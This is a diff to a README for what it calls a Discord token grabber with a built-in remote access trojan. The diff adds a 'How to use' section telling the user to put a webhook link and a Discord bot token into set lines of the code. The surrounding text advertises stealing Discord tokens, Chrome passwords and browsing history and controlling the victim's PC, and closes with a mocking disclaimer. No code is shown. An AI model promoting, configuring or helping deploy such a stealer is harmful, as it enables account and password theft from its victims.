@@ -6,5 +6,9 @@ PLEASE NOTE THAT I DO NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE CAUSE BY THIS A
 This is a pretty powerful discord token grabber with a built in rat that not only grabs all of your tokens but also grabs your chrome passwords, history and gets information about your pc.
 There is also a built in bot system to control the grabber on the victims pc
 
+# How to use
+add your webhook link on line 34
+add your discord bot token on line 792
+
 You can support this project by just starring the repository!
 Also, please don't use this for malicious purposes ;)
